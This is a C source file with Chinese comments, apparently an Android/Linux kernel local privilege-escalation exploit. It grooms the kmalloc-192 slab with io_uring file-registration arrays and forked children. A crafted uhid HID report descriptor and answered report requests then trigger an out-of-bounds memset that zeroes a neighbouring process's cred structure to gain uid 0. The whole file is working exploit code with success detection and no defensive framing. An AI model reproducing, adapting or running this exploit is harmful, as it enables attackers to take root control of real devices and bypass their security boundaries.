/* cred_g.c — cred 零化直攻实验(§DT 账目)
 *
 * 布局: kmalloc-192(cred_jar 同类 192B/21obj每页)
 *   60 轮交替: {uring_setup+REGISTER_FILES(nr=24→192B), fork 1 子进程(新 cred)}
 * 触发: report2 数据 184B ⇒ rsize=185 ⇒ kzalloc(192); report3=248B ⇒ w24=248-184=64
 *   ⇒ memset(buf+185,0,64) ⇒ 自尾7B + 邻居[0..56] = cred usage/uid/gid/.../caps 全零
 *   ⇒ 邻居若为子进程 cred ⇒ 子进程 getuid()==0 ⇒ 管道 canary
 * 每轮释放 3 个数组(1 被 probe 抢, 1 给 mt kzalloc, 1 冗余)
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <linux/filter.h>

#define EVSZ 4380
#define ROUNDS 60
#define SPARE 4

static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

static const unsigned char wptp[] = {
0x05, 0x0D, 0x09, 0x05, 0xA1, 0x01,
    0x85, 0x01,
    0x09, 0x56, 0x24, 0x00, 0x26, 0xFF, 0xFF, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x54, 0x25, 0x05, 0x75, 0x08, 0x81, 0x02,
    0x05, 0x20, 0x0A, 0x94, 0x04, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
    0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x0D, 0x09, 0x22, 0xA1, 0x02,
        0x09, 0x51, 0x25, 0x0F, 0x75, 0x04, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x42, 0x25, 0x01, 0x75, 0x01, 0x81, 0x02,
        0x09, 0x47, 0x81, 0x02,
        0x95, 0x05, 0x81, 0x03,
        0x05, 0x01, 0x09, 0x30, 0x15, 0x00, 0x26, 0xC8, 0x00, 0x35, 0x00,
        0x45, 0x69, 0x65, 0x11, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x31, 0x26, 0x96, 0x00, 0x45, 0x4B, 0x81, 0x02,
        0x05, 0x0D, 0x09, 0x30, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
        0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0xC0,
    0x05, 0x09, 0x09, 0x01, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01,
    0x81, 0x02, 0x95, 0x07, 0x81, 0x03,
    0x85, 0x02,
    0x05, 0x0D, 0x09, 0x55, 0x25, 0x05, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0x09, 0x59, 0x25, 0x02, 0xB1, 0x02,
    /* [A] +182B const feature ⇒ report2 = 184B ⇒ rsize=185 ⇒ kzalloc(192) */
    /* [B] report3 = 248B ⇒ w24 = 248-184 = 64 ⇒ 邻居 cred[0..56] 零化 */
    0x85, 0x40,
    0x05, 0x0D, 0x09, 0xB0, 0x15, 0x01, 0x25, 0x03, 0x35, 0x6E, 0x45, 0xBE,
    0x65, 0x12, 0x75, 0x02, 0x95, 0x01, 0xB1, 0x02,
    0x85, 0x41,
    0x05, 0x0E, 0x09, 0x01, 0xA1, 0x02,
        0x09, 0x23, 0x15, 0x00, 0x25, 0x04, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0xC0,
0xC0,
};
static unsigned char desc[4096];
static unsigned desc_len;

static void build_desc(void){
    static const unsigned char padA[] = { 0x75,0x08, 0x95,0xB6, 0xB1,0x03 };  /* +182B */
    static const unsigned char rep3[] = { 0x85,0x03, 0x75,0x08, 0x95,0xF8, 0xB1,0x03 };
    int pos = 0, i = 0, insA = -1;
    while (i < (int)sizeof(wptp) - 5){
        if (wptp[i]==0x09 && wptp[i+1]==0x59 && wptp[i+2]==0x25 && wptp[i+3]==0x02
            && wptp[i+4]==0xB1 && wptp[i+5]==0x02){ insA = i+6; break; }
        i++;
    }
    memcpy(desc+pos, wptp, insA);                    pos += insA;
    memcpy(desc+pos, padA, sizeof(padA));            pos += sizeof(padA);
    memcpy(desc+pos, rep3, sizeof(rep3));            pos += sizeof(rep3);
    memcpy(desc+pos, wptp+insA, sizeof(wptp)-insA);  pos += sizeof(wptp)-insA;
    desc_len = pos;
}

static int create_legacy(int fd, const char *name){
    memset(ev,0,EVSZ);
    wr32(0,0);
    strncpy((char*)(ev+4), name, 127);
    strncpy((char*)(ev+132), "virt-0", 63);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260,&p,8);
    wr16(268,(uint16_t)desc_len);
    wr16(270,0x0003);
    wr32(272,0x1234); wr32(276,0x5678); wr32(280,1);
    errno=0;
    ssize_t w = write(fd,ev,EVSZ);
    if (w<=0){ printf("CREATE 失败 ret=%zd errno=%d\n", w, errno); return -1; }
    return 0;
}
static int destroy_dev(int fd){
    memset(ev,0,EVSZ); wr32(0,1);
    return write(fd,ev,EVSZ) > 0 ? 0 : -1;
}

static long sys_setup(unsigned n, void*p){ return syscall(425,n,p); }
static long sys_reg(unsigned fd, unsigned op, void*a, unsigned n){ return syscall(427, fd, op, a, n); }

int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
    int n_cycles = argc>1 ? atoi(argv[1]) : 18;
    build_desc();
    printf("=== cred_g: %d cycles desc=%u B (rsize=185 kzalloc192 w24=64) ===\n", n_cycles, desc_len);

    int cp[2]; if (pipe(cp)){ perror("pipe"); return 1; }
    int can_wr = dup(cp[1]);

    int keep = open("/dev/zero", O_RDONLY);
    int nr = 24;                         /* 24*8 = 192B */
    int ufds[ROUNDS];
    pid_t kids[ROUNDS];
    int n = 0;

    /* ---- 交替整形: [REG_FILES nr24(192B)] [fork cred] ---- */
    for (int i=0;i<ROUNDS;i++){
        struct { uint64_t x[30]; } p; memset(&p,0,sizeof p);
        long u = sys_setup(4, &p);
        if (u < 0) break;
        int rf[24];
        for (int j=0;j<nr;j++) rf[j] = dup(keep);
        if (sys_reg((unsigned)u, 2, rf, nr) != 0){ printf("REG 失败\n"); for(int j=0;j<nr;j++)close(rf[j]); break; }
        ufds[n] = (int)u;
        pid_t pid = fork();
        if (pid == 0){
            for (int f=6; f<1024; f++) if (f!=can_wr) close(f);
            uid_t b = getuid(), e = geteuid(); gid_t g = getgid();
            for(;;){
                if (getuid()!=b || geteuid()!=e || getgid()!=g){
                    char m[96];
                    int nn = snprintf(m,sizeof m,"★UIDWIN pid=%d uid=%d euid=%d gid=%d\n",
                                      getpid(),getuid(),geteuid(),getgid());
                    ssize_t w; do { w=write(can_wr,m,nn); } while (w<0 && errno==EINTR);
                    pause();
                }
                usleep(50000);
            }
        }
        kids[n] = pid;
        n++;
    }
    for (int i=0;i<SPARE;i++){ /* 备用 uring: 吃 probe 抢占的槽位 */ 
        struct { uint64_t x[30]; } p; memset(&p,0,sizeof p);
        sys_setup(4, &p);
    }
    printf("整形完成: %d 组 [数组 nr24 + fork]\n", n);
    close(can_wr);

    /* ---- 触发循环 ---- */
    int ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
    if (ufd<0){ printf("open uhid 失败\n"); return 1; }
    int hits = 0;
    for (int c=0;c<n_cycles && c*3+2<n;c++){
        /* 1) 释放 3 个数组 */
        for (int k=0;k<3;k++){
            int idx = c*3 + k;
            if (ufds[idx] >= 0){
                sys_reg((unsigned)ufds[idx], 3, NULL, 0);
                ufds[idx] = -1;
            }
        }
        /* 2) CREATE → 应答(type10, data[0]=3) → DESTROY */
        int got = 0;
        if (create_legacy(ufd,"cg")<0) break;
        for (int t=0;t<10;t++){
            struct timeval tv={0,200000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd,&rf);
            if (select(ufd+1,&rf,NULL,NULL,&tv)<=0) continue;
            ssize_t r = read(ufd,ev,EVSZ);
            if (r<=0) continue;
            uint32_t type = rd32(0);
            if (type==9 || type==13){
                uint8_t rnum = ev[8];
                int oob = (rnum==2);
                memset(ev,0,EVSZ);
                wr32(0, type==9?10:14);   /* ★ 应答类型 = 事件类型+1 */
                wr32(4,rd32(4)); wr16(8,0);
                wr16(10, oob?128:1);
                ev[12] = oob?3:0;
                ssize_t w = write(ufd,ev,EVSZ);
                printf("  ANSWER(rnum=%u oob=%d) ret=%zd\n", rnum, oob, w);
                if (oob) got=1;
            }
        }
        usleep(30000);
        destroy_dev(ufd);
        usleep(30000);
        /* 3) canary */
        fd_set rf; FD_ZERO(&rf); FD_SET(cp[0],&rf);
        struct timeval tv={0,0};
        while (select(cp[0]+1,&rf,NULL,NULL,&tv)>0){
            char m[128]; ssize_t nn=read(cp[0],m,sizeof m-1);
            if (nn<=0) break; m[nn>0?nn:0]=0;
            printf("  canary: %s", m);
            hits++;
            FD_ZERO(&rf); FD_SET(cp[0],&rf); tv.tv_sec=0; tv.tv_usec=0;
        }
        if (getuid()!=2000 || geteuid()!=2000){
            printf("★PARENT WIN uid=%d euid=%d\n", getuid(), geteuid());
            hits++;
        }
        printf("[%d/%d] got=%d hits=%d\n", c+1, n_cycles, got, hits);
    }

    printf("=== 结束: hits=%d ===\n", hits);
    for (int i=0;i<n;i++) kill(kids[i],SIGKILL);
    return hits>0?0:2;
}
